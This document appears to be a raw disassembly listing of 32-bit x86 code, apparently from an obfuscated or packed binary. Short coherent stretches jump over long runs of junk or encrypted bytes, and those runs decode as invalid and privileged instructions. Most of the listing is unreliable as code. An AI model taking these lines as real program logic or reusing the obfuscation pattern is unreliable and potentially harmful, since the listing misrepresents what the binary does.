  40f60c:	mov    DWORD PTR [ebp-0x1c],esi
  40f60f:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  40f616:	mov    DWORD PTR [ebp-0x14],0x7
  40f61d:	mov    DWORD PTR [ebp-0x10],0xe3a
  40f624:	mov    DWORD PTR [ebp-0xc],0x6a6e
  40f62b:	mov    DWORD PTR [ebp-0x8],0x6b99
  40f632:	mov    DWORD PTR [ebp-0x4],0x2acd
  40f639:	mov    eax,DWORD PTR [ebp-0x10]
  40f63c:	mov    ecx,DWORD PTR [ebp-0xc]
  40f63f:	mov    eax,DWORD PTR [ebp-0x8]
  40f642:	mov    ecx,DWORD PTR [ebp-0x4]
  40f645:	mov    eax,DWORD PTR [ebp-0x18]
  40f648:	mov    ecx,DWORD PTR [ebp-0x14]
  40f64b:	mov    eax,DWORD PTR [ebp-0x8]
  40f64e:	jmp    0x40fa02
  40f653:	pusha  
  40f654:	and    cl,BYTE PTR [esi]
  40f656:	push   ebp
  40f657:	xchg   esp,eax
  40f658:	jns    0x40f602
  40f65a:	cmp    al,0x86
  40f65c:	aas    
  40f65d:	(bad)  
  40f65f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f660:	add    edi,esp
  40f662:	jecxz  0x40f6bc
  40f664:	push   ds
  40f665:	mov    esi,0xbec4e3be
  40f66a:	mov    esi,0x9461e6b5
  40f66f:	out    dx,al
  40f670:	call   0x26:0xc1c68428
  40f677:	mov    eax,0xe1f4e70c
  40f67c:	es sahf 
  40f67e:	fistp  DWORD PTR [eax+0x57]
  40f681:	ja     0x40f6c5
  40f683:	repnz cmc 
  40f685:	inc    esp
  40f686:	pop    ebp
  40f687:	leave  
  40f688:	xchg   ebx,eax
  40f689:	fsubr  DWORD PTR [ebp+0x4d]
  40f68c:	push   es
  40f68d:	mov    ds:0x6aea4ddd,eax
  40f692:	aaa    
  40f693:	mov    bl,0x1e
  40f695:	push   ebp
  40f696:	sbb    eax,0x5af01a95
  40f69b:	jne    0x40f66f
  40f69d:	jl     0x40f6f0
  40f69f:	mov    esp,0xb3881fc0
  40f6a4:	ins    DWORD PTR es:[edi],dx
  40f6a5:	mov    ah,0xdc
  40f6a7:	call   0xdaa4a058
  40f6ac:	xor    eax,0xea7f975
  40f6b1:	mov    eax,0x27d0ea32
  40f6b6:	or     BYTE PTR [edx+ecx*2],0xa3
  40f6ba:	mov    eax,0x3b67a289
  40f6bf:	sub    dh,ch
  40f6c1:	outs   dx,BYTE PTR ds:[esi]
  40f6c2:	sub    eax,ebx
  40f6c4:	sbb    eax,0x18ce4522
  40f6c9:	test   eax,0x690c4230
  40f6ce:	sti    
  40f6cf:	sub    al,0x58
  40f6d1:	shr    BYTE PTR [esi-0x3fb70650],0xb1
  40f6d8:	sub    eax,0xaadc6656
  40f6dd:	lods   eax,DWORD PTR ds:[esi]
  40f6de:	pop    esi
  40f6df:	enter  0x9a76,0x3d
  40f6e3:	sbb    eax,0xe350664c
  40f6e8:	mov    DWORD PTR [esi-0x64],ebx
  40f6eb:	jp     0x40f6e3
  40f6ed:	and    al,0x99
  40f6ef:	xor    eax,0x6f71ec0d
  40f6f4:	adc    cl,0xd5
  40f6f7:	xchg   DWORD PTR [edi+0x1c],edi
  40f6fa:	jl     0x40f75e
  40f6fc:	js     0x40f73c
  40f6fe:	xchg   ebx,eax
  40f6ff:	push   ss
  40f700:	lods   eax,DWORD PTR ds:[esi]
  40f701:	leave  
  40f702:	xlat   BYTE PTR ds:[ebx]
  40f703:	gs push cs
  40f705:	ins    DWORD PTR es:[edi],dx
  40f706:	sbb    DWORD PTR [ecx+0x342e9399],0xffffffcc
  40f70d:	jno    0x40f6cc
  40f70f:	mov    ecx,0x83fc8bb1
  40f714:	stos   BYTE PTR es:[edi],al
  40f715:	mov    bh,0xeb
  40f717:	jo     0x40f788
  40f719:	or     bl,al
  40f71b:	sar    BYTE PTR [ecx],0x89
  40f71e:	int3   
  40f71f:	aam    0xbe
  40f721:	icebp  
  40f722:	dec    edi
  40f723:	mov    ds:0xedd8da35,al
  40f728:	pop    ebp
  40f729:	ins    WORD PTR es:[edi],dx
  40f72b:	cmp    al,0xaa
  40f72d:	dec    ecx
  40f72e:	retf   0x27f9
  40f731:	adc    dh,BYTE PTR [eax-0x2e]
  40f734:	(bad)  
  40f736:	in     al,dx
  40f737:	rcl    DWORD PTR [ebx+eax*8],1
  40f73a:	mov    ebx,ebx
  40f73c:	test   esp,ebp
  40f73e:	gs push 0xffffffea
  40f741:	push   ebx
  40f742:	xchg   edi,eax
  40f743:	clc    
  40f744:	inc    esi
  40f745:	add    ebp,ecx
  40f747:	xor    dh,cl
  40f749:	retf   
  40f74a:	mov    ah,BYTE PTR [esi+0x26]
  40f74d:	jg     0x40f770
  40f74f:	mov    ds:0xbb581fe8,eax
  40f754:	mov    edx,0xd907ac27
  40f759:	cld    
  40f75a:	popf   
  40f75b:	add    eax,DWORD PTR [esi+0x689f5da6]
  40f761:	shl    eax,0x4d
  40f764:	stos   DWORD PTR es:[edi],eax
  40f765:	xchg   edi,eax
  40f766:	in     eax,dx
  40f767:	aam    0xc6
  40f769:	aaa    
  40f76a:	jbe    0x40f777
  40f76c:	and    WORD PTR [edx-0x6b1ea05c],bx
  40f773:	xchg   esp,eax
  40f774:	xor    edi,ebx
  40f776:	mov    edx,0xd5652f6f
  40f77b:	inc    edi
  40f77c:	popf   
  40f77d:	jle    0x40f7f8
  40f77f:	add    BYTE PTR [edi-0xc8d9939],0x24
  40f786:	sbb    cl,BYTE PTR [eax-0xd040267]
  40f78c:	push   cs
  40f78d:	fs mov ah,0x1
  40f790:	adc    DWORD PTR [ebx-0x2944ef99],ecx
  40f796:	psadbw mm3,QWORD PTR [ebp+0x165673b8]
  40f79d:	pop    ebx
  40f79e:	dec    ebp
  40f79f:	test   eax,0x7194e763
  40f7a4:	out    dx,eax
  40f7a5:	or     eax,0x1796d70a
  40f7aa:	cmp    eax,DWORD PTR [edx]
  40f7ac:	imul   edi,DWORD PTR [esi+0x1],0xd39ddcfe
  40f7b3:	retf   0x757f
  40f7b6:	sub    BYTE PTR [ecx],ah
  40f7b8:	jge    0x40f832
  40f7ba:	jne    0x40f80a
  40f7bc:	dec    edi
  40f7bd:	scas   al,BYTE PTR es:[edi]
  40f7be:	les    ebp,FWORD PTR [ebp+0x74eedab7]
  40f7c4:	push   cs
  40f7c5:	inc    esi
  40f7c6:	push   ecx
  40f7c7:	pop    ds
  40f7c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c9:	and    ah,ch
  40f7cb:	xlat   BYTE PTR ds:[ebx]
  40f7cc:	push   0xffffff89
  40f7ce:	fwait
  40f7cf:	push   0x2e
  40f7d1:	imul   edi,DWORD PTR [edi],0xffffffb3
  40f7d4:	dec    esp
  40f7d5:	test   DWORD PTR [esp+eax*4],0x851117b9
  40f7dc:	cs aad 0xa0
  40f7df:	cmp    DWORD PTR [edx],0x35
  40f7e2:	stc    
  40f7e3:	sub    al,0x62
  40f7e5:	xchg   esp,eax
  40f7e6:	sbb    cl,0xb6
  40f7e9:	test   eax,0x3b84ea06
  40f7ee:	sub    al,0x2
  40f7f0:	cli    
  40f7f1:	or     al,0x1b
  40f7f3:	xchg   ecx,eax
  40f7f4:	(bad)  
  40f7f6:	push   ebx
  40f7f7:	jmp    0x409feceb
  40f7fc:	mov    ecx,eax
  40f7fe:	js     0x40f875
  40f800:	pusha  
  40f801:	push   eax
  40f802:	lods   al,BYTE PTR ds:[esi]
  40f803:	jmp    0xc62efbf0
  40f808:	fsubr  st(5),st
  40f80a:	js     0x40f7bc
  40f80c:	shl    DWORD PTR [ecx+0x0],0xb1
  40f810:	push   ebp
  40f811:	pop    ss
  40f812:	push   es
  40f813:	mov    eax,ds:0x5d6ed386
  40f818:	div    BYTE PTR [eax+0x4c]
  40f81b:	stos   BYTE PTR es:[edi],al
  40f81c:	test   BYTE PTR [eax-0x774735d2],dh
  40f822:	scas   al,BYTE PTR es:[edi]
  40f823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f824:	ret    
  40f825:	outs   dx,DWORD PTR ds:[esi]
  40f826:	push   ss
  40f827:	stc    
  40f828:	dec    ecx
  40f829:	lds    ecx,FWORD PTR [eax]
  40f82b:	add    eax,0x3480ecd5
  40f830:	mov    edi,0x54d74872
  40f835:	adc    al,0xbb
  40f837:	aaa    
  40f838:	outs   dx,DWORD PTR ds:[esi]
  40f839:	add    eax,0x25c0f818
  40f83e:	fs push esp
  40f840:	in     al,0xae
  40f842:	notrack call DWORD PTR [ecx+0x7c]
  40f846:	(bad)  
  40f847:	es pop es
  40f849:	inc    esp
  40f84a:	dec    eax
  40f84b:	mov    eax,edx
  40f84d:	pusha  
  40f84e:	jge    0x40f831
  40f850:	sbb    ebx,DWORD PTR [ecx+0x44]
  40f853:	push   0x6b17bacf
  40f858:	sahf   
  40f859:	loopne 0x40f8a9
  40f85b:	and    BYTE PTR ds:0x8121c059,ch
  40f861:	enter  0xff4e,0xa
  40f865:	mov    cl,0xbd
  40f867:	sub    eax,0xcde22b29
  40f86c:	jmp    0x40f8ea
  40f86e:	fidivr WORD PTR [edi-0x6]
  40f871:	adc    ah,BYTE PTR [edi-0xd7b774e]
  40f877:	fmul   DWORD PTR [edi-0x5b]
  40f87a:	inc    ecx
  40f87b:	jmp    0x40f832
  40f87d:	(bad)  
  40f87e:	imul   eax,DWORD PTR [edx+0x1a007cdf],0xffffffa9
  40f885:	sbb    edx,DWORD PTR [edi+0x7792ee49]
  40f88b:	mov    dl,0x8d
  40f88d:	scas   al,BYTE PTR es:[edi]
  40f88e:	mov    edx,0x5bd97518
  40f893:	mov    ecx,0x28b088d1
  40f898:	test   ebx,ebp
  40f89a:	cmp    al,0xfb
  40f89c:	ins    DWORD PTR es:[edi],dx
  40f89d:	add    al,0xe4
  40f89f:	lea    edx,[eax+eiz*4-0x38952963]
  40f8a6:	mov    BYTE PTR [ecx-0x66e93cad],0xa4
  40f8ad:	jo     0x40f91f
  40f8af:	sbb    eax,0xcab2e42
  40f8b4:	dec    edi
  40f8b5:	or     eax,0xff74e9e2
  40f8ba:	sub    DWORD PTR [ecx+0x69c9ef07],esp
  40f8c0:	xchg   edx,eax
  40f8c1:	retf   
  40f8c2:	jge    0x40f935
  40f8c4:	mov    bl,0x2f
  40f8c6:	fsub   QWORD PTR ds:0x8977f79e
  40f8cc:	daa    
  40f8cd:	and    BYTE PTR [esi+0x2e],bh
  40f8d0:	push   eax
  40f8d1:	loopne 0x40f884
  40f8d3:	adc    BYTE PTR [esp+eax*2],0x8d
  40f8d7:	outs   dx,DWORD PTR ds:[esi]
  40f8d8:	lds    esi,FWORD PTR [edx-0x64]
  40f8db:	xor    BYTE PTR [ebp-0x49],ch
  40f8de:	fimul  WORD PTR [ebx-0x4694758c]
  40f8e4:	add    al,0x70
  40f8e6:	loop   0x40f8f5
  40f8e8:	gs xor eax,0x9e57e713
  40f8ee:	xchg   ebx,eax
  40f8ef:	call   0x70fc:0x4dc9dee
  40f8f6:	psllw  mm1,QWORD PTR [ecx+0x37]
  40f8fa:	cmp    dl,BYTE PTR [eax+0x6f]
  40f8fd:	out    0xfe,al
  40f8ff:	aam    0xb7
  40f901:	ret    
  40f902:	ins    BYTE PTR es:[edi],dx
  40f903:	rcl    esi,0x76
  40f906:	pop    ss
  40f907:	cmp    bh,bh
  40f909:	xor    bh,BYTE PTR [ebx-0x4df8a68c]
  40f90f:	add    eax,0xdda84f0
  40f914:	inc    ebp
  40f915:	xchg   edx,eax
  40f916:	neg    BYTE PTR [ebx-0x60]
  40f919:	out    dx,al
  40f91a:	sbb    al,0x33
  40f91c:	xchg   sp,ax
  40f91e:	jmp    0xa23e:0x6eed763c
  40f925:	div    ch
  40f927:	push   edx
  40f928:	add    esi,ebp
  40f92a:	popf   
  40f92b:	dec    edi
  40f92c:	leave  
  40f92d:	adc    DWORD PTR [edi-0x397e12d1],ebx
  40f933:	dec    ecx
  40f934:	(bad)  
  40f935:	pop    esi
  40f936:	scas   al,BYTE PTR es:[edi]
  40f937:	or     eax,0xee3a70c0
  40f93c:	xchg   esi,eax
  40f93d:	loop   0x40f93c
  40f93f:	lods   al,BYTE PTR ds:[esi]
  40f940:	retf   0xb461
  40f943:	les    eax,FWORD PTR [edx-0x63]
  40f946:	ja     0x40f8e5
  40f948:	pop    esi
  40f949:	lea    esp,[eax]
  40f94b:	(bad)  
  40f94d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f94e:	mov    dh,0x5c
  40f950:	adc    DWORD PTR [esi],ecx
  40f952:	adc    DWORD PTR [eax+0x848b994],ebx
  40f958:	inc    ecx
  40f959:	or     DWORD PTR [ebp+0x3a88e0af],eax
  40f95f:	jns    0x40f9b4
  40f961:	add    BYTE PTR [edx+0x764826ec],cl
  40f967:	aaa    
  40f968:	sahf   
  40f969:	push   ebp
  40f96a:	push   edx
  40f96b:	in     al,dx
  40f96c:	xchg   edi,edi
  40f96e:	xor    BYTE PTR [ecx+0xd70ed2d],cl
  40f974:	inc    esp
  40f975:	push   ecx
  40f976:	xchg   esi,eax
  40f977:	es out dx,al
  40f979:	in     eax,0x51
  40f97b:	js     0x40f9cc
  40f97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f97e:	jmp    0x40f9fc
  40f980:	cld    
  40f981:	call   0x55f3:0xce7be671
  40f988:	pop    esp
  40f989:	sbb    BYTE PTR [eax-0x2379ae29],ah
  40f98f:	aad    0x9e
  40f991:	inc    ecx
  40f992:	scas   eax,DWORD PTR es:[edi]
  40f993:	icebp  
  40f994:	div    BYTE PTR [ebp+0x47]
  40f997:	pop    ds
  40f998:	mov    bl,0xa3
  40f99a:	push   0xffffffca
  40f99c:	mov    bh,0xd0
  40f99f:	add    ecx,DWORD PTR [eax+eax*2-0x1d]
  40f9a3:	mov    DWORD PTR [eax],eax
  40f9a5:	adc    eax,0xdbe2f659
  40f9aa:	mov    edi,0xd8d52fa2
  40f9af:	aad    0x7f
  40f9b1:	xchg   esp,eax
  40f9b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9b3:	enter  0x3c2a,0x63
  40f9b7:	int    0xc2
  40f9b9:	add    eax,0x3c7e48bb
  40f9be:	clc    
  40f9bf:	jne    0x40fa3d
  40f9c1:	xchg   BYTE PTR [ecx+0x67],cl
  40f9c4:	add    BYTE PTR [edx+0x55],cl
  40f9c7:	out    dx,al
  40f9c8:	pusha  
  40f9c9:	fistp  QWORD PTR [eax+ebp*8]
  40f9cc:	hlt    
  40f9cd:	lods   al,BYTE PTR ds:[esi]
  40f9ce:	xchg   ecx,eax
  40f9cf:	ins    BYTE PTR es:[edi],dx
  40f9d0:	fbstp  TBYTE PTR [edi+0x23]
  40f9d3:	lods   eax,DWORD PTR ds:[esi]
  40f9d4:	adc    esi,DWORD PTR [ecx-0x37]
  40f9d7:	jecxz  0x40f9ac
  40f9d9:	pop    edi
  40f9da:	out    dx,eax
  40f9db:	xor    eax,0xe42a986c
  40f9e0:	xor    BYTE PTR [esi+eax*8+0x58],dh
  40f9e4:	mov    ds,WORD PTR [ebx-0x6bf7d2e8]
  40f9ea:	mov    al,ds:0xccb84336
  40f9ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9f0:	test   DWORD PTR [edi],ebp
  40f9f2:	cmp    BYTE PTR [ebx-0x7fdaa974],dh
  40f9f8:	xchg   ecx,eax
  40f9f9:	sti    
  40f9fa:	jmp    0x40f9b3
  40f9fc:	dec    ecx
  40f9fd:	icebp  
  40f9fe:	xchg   edx,eax
  40f9ff:	call   0x8bfc:0x4d8bdbd3
  40fa06:	push   ebp
  40fa07:	lock mov edi,DWORD PTR [ebp-0xc]
  40fa0b:	add    eax,edx
  40fa0d:	mov    edx,DWORD PTR [ebp-0x18]
  40fa10:	adc    ecx,edi
  40fa12:	mov    edi,DWORD PTR [ebp-0x14]
  40fa15:	push   edi
  40fa16:	push   edx
  40fa17:	or     ecx,0x6833
  40fa1d:	or     eax,0x6b80
  40fa22:	push   ecx
  40fa23:	push   eax
  40fa24:	call   0x422239
  40fa29:	mov    ecx,DWORD PTR [ebp-0x20]
  40fa2c:	mov    edi,DWORD PTR [ebp-0x1c]
  40fa2f:	and    eax,0x25cb
  40fa34:	jmp    0x40fde8
  40fa39:	js     0x40fa83
  40fa3b:	cld    
  40fa3c:	(bad)  
  40fa3e:	jb     0x40fabc
  40fa40:	pop    eax
  40fa41:	dec    eax
  40fa42:	lods   eax,DWORD PTR ds:[esi]
  40fa43:	push   cs
  40fa44:	sahf   
  40fa45:	leave  
  40fa46:	jge    0x40f9de
  40fa48:	jecxz  0x40fac7
  40fa4a:	es mov esi,0xbec4e3be
  40fa50:	mov    esi,0x922cf726
  40fa55:	stc    
  40fa56:	imul   ecx,DWORD PTR [ebx+0x26dafdbb],0x61a59bb
  40fa60:	(bad)  
  40fa62:	add    BYTE PTR [edi+0x307abbfa],dl
  40fa68:	imul   BYTE PTR [esi+eiz*1]
  40fa6b:	call   0xea11:0xaa7e32e0
  40fa72:	in     eax,0xb6
  40fa74:	sti    
  40fa75:	and    dl,ah
  40fa77:	int3   
  40fa78:	dec    esp
  40fa79:	push   ecx
  40fa7a:	add    eax,0xb0a6cced
  40fa7f:	push   esi
  40fa80:	xor    al,0xcf
  40fa82:	pop    ebx
  40fa83:	dec    esi
  40fa84:	divps  xmm0,xmm3
  40fa87:	pop    ebp
  40fa88:	adc    cl,dl
  40fa8a:	fdivr  DWORD PTR [eax+0x4ac7f1de]
  40fa90:	stc    
  40fa91:	test   DWORD PTR [edi+0x310fe977],esp
  40fa97:	popa   
  40fa98:	push   eax
  40fa99:	out    0x69,eax
  40fa9b:	lds    esi,FWORD PTR [esi]
  40fa9d:	inc    edx
  40fa9e:	es (bad) 
  40faa0:	call   0xaf491025
  40faa5:	mov    al,0xdb
  40faa7:	test   eax,0x9a5bb909
  40faac:	push   ss
  40faad:	pop    ss
  40faae:	xor    DWORD PTR [ebx+esi*8+0x14],ebx
  40fab2:	pop    esp
  40fab3:	pushf  
  40fab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fab5:	ja     0x40faca
  40fab7:	aaa    
  40fab8:	and    dl,al
  40faba:	xchg   ebp,ecx
  40fabc:	mov    eax,edx
  40fabe:	ret    
  40fabf:	fs inc edx
  40fac1:	loope  0x40faa1
  40fac3:	clc    
  40fac4:	jecxz  0x40fb02
  40fac6:	test   eax,0xa0f13d5d
  40facb:	adc    BYTE PTR [ebp-0x46],0x9b
  40facf:	inc    edi
  40fad0:	cdq    
  40fad1:	inc    ebx
  40fad2:	cmp    dl,BYTE PTR [eax-0x26b9f4c2]
  40fad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fad9:	push   esi
  40fada:	std    
  40fadb:	pop    ebx
  40fadc:	adc    ch,ah
  40fade:	cwde   
  40fadf:	pusha  
  40fae0:	mov    fs,WORD PTR [edx]
  40fae2:	jne    0x40fa87
  40fae4:	mov    eax,ds:0xc27c7d9b
  40fae9:	mov    BYTE PTR [ebx-0x105fe2a5],al
  40faef:	push   ebp
  40faf0:	inc    esp
  40faf1:	icebp  
  40faf2:	fild   WORD PTR [edi-0x5d]
  40faf5:	ins    BYTE PTR es:[edi],dx
  40faf6:	add    eax,0xca9cccc5
  40fafb:	adc    edi,0x9
  40fafe:	jle    0x40fb29
  40fb00:	sub    DWORD PTR [edi+0x63],esi
  40fb03:	fs add eax,0x442ab6e2
  40fb09:	stos   BYTE PTR es:[edi],al
  40fb0a:	adc    BYTE PTR [esi],al
  40fb0c:	aaa    
  40fb0d:	or     al,0xe6
  40fb10:	sbb    bl,ch
  40fb12:	xlat   BYTE PTR ds:[ebx]
  40fb13:	xchg   ebx,eax
  40fb14:	push   esp
  40fb15:	aas    
  40fb16:	lea    eax,[edi+0xf]
  40fb19:	push   es
  40fb1a:	jne    0x40faef
  40fb1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb1d:	inc    eax
  40fb1e:	and    al,0xba
  40fb20:	sub    ch,BYTE PTR [ebp+0x29]
  40fb23:	hlt    
  40fb24:	pop    ecx
  40fb25:	sub    DWORD PTR [ecx],0x407f59df
  40fb2b:	out    dx,al
  40fb2c:	imul   edx,DWORD PTR [esi],0x3d
  40fb2f:	xchg   ebx,eax
  40fb30:	cmc    
  40fb31:	sbb    bl,BYTE PTR [ebx+0x4]
  40fb34:	sub    BYTE PTR [edx-0x57c2ed1b],ah
  40fb3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb3b:	mov    ds:0x22372856,eax
  40fb40:	js     0x40fad3
  40fb42:	inc    edx
  40fb43:	mov    al,0x57
  40fb45:	jno    0x40fb75
  40fb47:	mov    ebp,0xadd1ea0b
  40fb4c:	inc    edx
  40fb4d:	xor    BYTE PTR [edx-0x106eff46],bl
  40fb53:	jl     0x40fb78
  40fb55:	push   esp
  40fb56:	push   es
  40fb57:	jmp    0x40faec
  40fb59:	inc    esp
  40fb5a:	(bad)  
  40fb5b:	mov    fs,WORD PTR [edi]
  40fb5d:	rol    BYTE PTR cs:[eax-0x62307556],1
  40fb64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb66:	inc    ebx
  40fb67:	xor    DWORD PTR [ebx+0x2db08c8],eax
  40fb6d:	jp     0x40fb97
  40fb6f:	pop    esp
  40fb70:	mov    esp,0xba5f7285
  40fb75:	and    eax,0xaf4a6ecc
  40fb7a:	xlat   BYTE PTR ds:[ebx]
  40fb7b:	es lahf 
  40fb7d:	test   BYTE PTR [ebx],ah
  40fb7f:	data16 cld 
  40fb81:	jmp    0xb6c0d06
  40fb86:	or     edx,edx
  40fb88:	outs   dx,DWORD PTR ds:[esi]
  40fb89:	dec    ebp
  40fb8a:	scas   al,BYTE PTR es:[edi]
  40fb8b:	lea    edi,[edx]
  40fb8d:	jp     0x40fbb2
  40fb8f:	popf   
  40fb90:	pop    ds
  40fb91:	mov    dh,0x55
  40fb93:	adc    DWORD PTR [edx],ebx
  40fb95:	push   ebx
  40fb96:	enter  0x3bfb,0xa1
  40fb9a:	push   0xd419de5
  40fb9f:	cmp    BYTE PTR [ecx-0x6622b3ea],al
  40fba5:	or     DWORD PTR [eax],edx
  40fba7:	mov    BYTE PTR [edx*8-0x755bbd30],ah
  40fbae:	ja     0x40fb7a
  40fbb0:	dec    ecx
  40fbb1:	popf   
  40fbb2:	clc    
  40fbb3:	dec    eax
  40fbb4:	imul   edi,DWORD PTR [ebx+0x6993bc34],0x38
  40fbbb:	push   esi
  40fbbc:	fwait
  40fbbd:	loopne 0x40fc37
  40fbbf:	aad    0x20
  40fbc1:	les    edx,FWORD PTR [ecx+0x1d]
  40fbc4:	scas   eax,DWORD PTR es:[edi]
  40fbc5:	push   ecx
  40fbc6:	mov    esp,0xdec39fc8
  40fbcb:	push   eax
  40fbcc:	mov    eax,0x345c0311
  40fbd1:	sti    
  40fbd2:	add    eax,0x9750bc4
  40fbd7:	xchg   edx,eax
  40fbd8:	sbb    dl,BYTE PTR [esi]
  40fbda:	fs push ebx
  40fbdc:	div    DWORD PTR [eax+0x3088c4f1]
  40fbe2:	dec    esi
  40fbe3:	shl    DWORD PTR [eax-0x3e],cl
  40fbe6:	push   ebp
  40fbe7:	bound  ebx,QWORD PTR [eax-0x1d]
  40fbea:	retf   0xcc56
  40fbed:	adc    ch,0x7a
  40fbf0:	xor    al,0x59
  40fbf2:	cld    
  40fbf3:	sahf   
  40fbf4:	addr16 lock mov eax,0x67bfc874
  40fbfb:	pop    esp
  40fbfc:	mov    ah,0x7b
  40fbfe:	inc    ebx
  40fbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc00:	repz sub dl,0x26
  40fc04:	pop    esp
  40fc05:	cmc    
  40fc06:	ds push 0xebb138d0
  40fc0c:	mov    esp,DWORD PTR [esi-0x23]
  40fc0f:	pop    esi
  40fc10:	out    dx,al
  40fc11:	repz adc BYTE PTR [ebp-0x52e1173e],bh
  40fc18:	add    esi,DWORD PTR [edi+0x67af9939]
  40fc1e:	mov    al,0x19
  40fc20:	ficomp DWORD PTR [ebx+edi*4+0x3b1d4896]
  40fc27:	push   es
  40fc28:	idiv   BYTE PTR [ebp-0x77]
  40fc2b:	ror    DWORD PTR [ebx-0x57d5ec24],0xf6
  40fc32:	jmp    0x40fc4b
  40fc34:	dec    esp
  40fc35:	shr    BYTE PTR [edi+0x77],0x36
  40fc39:	data16 (bad) 
  40fc3b:	ja     0x40fbf8
  40fc3d:	add    ah,BYTE PTR [esi+eiz*2]
  40fc40:	out    0x4e,eax
  40fc42:	or     al,0x62
  40fc44:	sub    esp,DWORD PTR [ebp*1-0x77991535]
  40fc4b:	imul   ebp,ebx,0x4b
  40fc4e:	mov    esp,0x635a0687
  40fc53:	cmp    eax,0xfd1699dc
  40fc58:	push   0xddea5ba9
  40fc5d:	aaa    
  40fc5e:	int3   
  40fc5f:	push   esi
  40fc60:	iret   
  40fc61:	(bad)  
  40fc62:	sub    ebx,DWORD PTR [ecx+0x29]
  40fc65:	push   eax
  40fc66:	mov    eax,ds:0x8c9a8aa7
  40fc6b:	add    al,0x94
  40fc6d:	pop    ds
  40fc6e:	fsubr  QWORD PTR [ebx+0x49]
  40fc71:	stc    
  40fc72:	ins    DWORD PTR es:[edi],dx
  40fc73:	sbb    eax,0xa3df8a51
  40fc78:	in     eax,0xe4
  40fc7a:	sub    dh,ah
  40fc7c:	lds    ecx,FWORD PTR [ecx+0x3c4aa608]
  40fc82:	dec    ebx
  40fc83:	test   BYTE PTR [ecx-0x64cbe278],0x45
  40fc8a:	sahf   
  40fc8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc8d:	aam    0xca
  40fc8f:	dec    ecx
  40fc90:	lods   eax,DWORD PTR ds:[esi]
  40fc91:	loope  0x40fce2
  40fc93:	xor    BYTE PTR [esi+0x5a],ah
  40fc96:	es jne 0x40fc9f
  40fc99:	out    dx,al
  40fc9a:	jle    0x40fc57
  40fc9c:	dec    ebp
  40fc9d:	fnstenv [ebp-0x46]
  40fca0:	sbb    ebx,DWORD PTR [ebx+0x4e]
  40fca3:	fistp  QWORD PTR [ecx-0x7cd76c2c]
  40fca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcaa:	scas   al,BYTE PTR es:[edi]
  40fcab:	push   edx
  40fcac:	sub    esp,ebp
  40fcae:	fcom   DWORD PTR [edi+0xa]
  40fcb1:	leave  
  40fcb2:	les    esp,FWORD PTR [ebx+0x52]
  40fcb5:	sub    BYTE PTR [eax+0x64e17100],ch
  40fcbb:	nop
  40fcbc:	mov    bl,0xde
  40fcbe:	adc    DWORD PTR [ebx-0x2f],esp
  40fcc1:	mov    ebp,0xc13e6716
  40fcc6:	dec    esi
  40fcc7:	loopne 0x40fcd9
  40fcc9:	fs enter 0xa2d2,0xd8
  40fcce:	add    dh,dh
  40fcd0:	jl     0x40fc8a
  40fcd2:	loop   0x40fc5a
  40fcd4:	sbb    eax,0xffbc816f
  40fcd9:	adc    eax,DWORD PTR [edx]
  40fcdb:	in     eax,dx
  40fcdc:	xor    DWORD PTR [esi+eiz*2],eax
  40fcdf:	in     al,dx
  40fce0:	mov    BYTE PTR [eax],ah
  40fce2:	test   BYTE PTR [ecx-0x4a],bh
  40fce5:	push   cs
  40fce6:	add    BYTE PTR [ebx],cl
  40fce8:	ins    BYTE PTR es:[edi],dx
  40fce9:	cmp    al,0x4e
  40fceb:	xchg   esp,eax
  40fcec:	mov    al,ds:0x150a7a56
  40fcf1:	scas   eax,DWORD PTR es:[edi]
  40fcf2:	hlt    
  40fcf3:	push   0xe6b6877a
  40fcf8:	mov    esp,DWORD PTR [eax-0x23e0b240]
  40fcfe:	imul   ebx,ebx,0xffffffb5
  40fd01:	mov    bl,BYTE PTR [esi-0x46a90649]
  40fd07:	std    
  40fd08:	scas   eax,DWORD PTR es:[edi]
  40fd09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd0a:	add    edi,DWORD PTR [edx-0x3a]
  40fd0d:	sub    al,0x72
  40fd0f:	aam    0xa
  40fd11:	jl     0x40fcc2
  40fd13:	sbb    al,0x79
  40fd15:	pmullw mm6,QWORD PTR [ebp+ecx*8-0x24cbe2f7]
  40fd1d:	test   DWORD PTR [ebp-0x15],ebp
  40fd20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd21:	pop    ecx
  40fd22:	hlt    
  40fd23:	dec    edx
  40fd24:	mov    dl,0x3
  40fd26:	aam    0x2e
  40fd28:	cmp    al,0x2e
  40fd2a:	add    al,BYTE PTR ds:0xf6e29a2
  40fd30:	mov    ch,0x6
  40fd32:	es inc edx
  40fd34:	mov    ds:0xa53b53ab,al
  40fd39:	and    ebp,DWORD PTR [ebp+ecx*1+0x48]
  40fd3d:	popf   
  40fd3e:	std    
  40fd3f:	mov    ecx,0xb8f00469
  40fd44:	push   es
  40fd45:	inc    edx
  40fd46:	ins    DWORD PTR es:[edi],dx
  40fd47:	xchg   edx,eax
  40fd48:	xchg   esp,eax
  40fd49:	out    dx,al
  40fd4a:	pop    eax
  40fd4b:	cmc    
  40fd4c:	mov    esp,0x2c2aaea8
  40fd51:	mov    ds:0x78cf0100,al
  40fd56:	in     eax,dx
  40fd57:	ss sub dh,0xbd
  40fd5b:	jecxz  0x40fd60
  40fd5d:	push   ebx
  40fd5e:	mov    cl,0xfe
